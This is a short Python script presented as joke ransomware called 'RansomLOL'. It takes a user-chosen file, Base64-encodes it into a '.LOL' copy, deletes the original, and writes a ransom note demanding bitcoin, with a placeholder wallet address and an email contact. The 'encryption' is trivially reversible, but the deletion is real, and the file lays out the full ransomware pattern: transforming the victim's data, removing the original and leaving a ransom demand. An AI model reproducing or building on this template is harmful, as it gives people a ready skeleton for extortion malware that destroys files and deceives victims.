import os
import base64

# Hardcoded "decryption" key
DECRYPTION_KEY = "ThisIsNotReal123!"

def encrypt_file(filepath):
    with open(filepath, "rb") as f:
        data = f.read()
    # "Encrypt" by Base64 encoding
    fake_encrypted = base64.b64encode(data).decode()
    new_path = filepath + ".LOL"
    with open(new_path, "w") as f:
        f.write(fake_encrypted)
    os.remove(filepath)  # "Deletes" original (evil laugh)

def drop_note():
    ransom_note = f"""
    YOUR FILES HAVE BEEN ENCRYPTED!
    Send 0.001 BTC to: 1FakeBTCAddress123456789
    Email: 0xCrypt1c@tutanota.com
    Decryption Key: {DECRYPTION_KEY}
    """
    with open("README_FOR_RANSOM.txt", "w") as f:
        f.write(ransom_note)

if __name__ == "__main__":
    print("[+] RansomLOL activated! (This is a joke.)")
    target_file = input("[?] File to 'encrypt': ").strip()
    if os.path.exists(target_file):
        encrypt_file(target_file)
        drop_note()
        print(f"[+] File encrypted. Key: {DECRYPTION_KEY}")
    else:
        print("[!] File not found. Try again.")
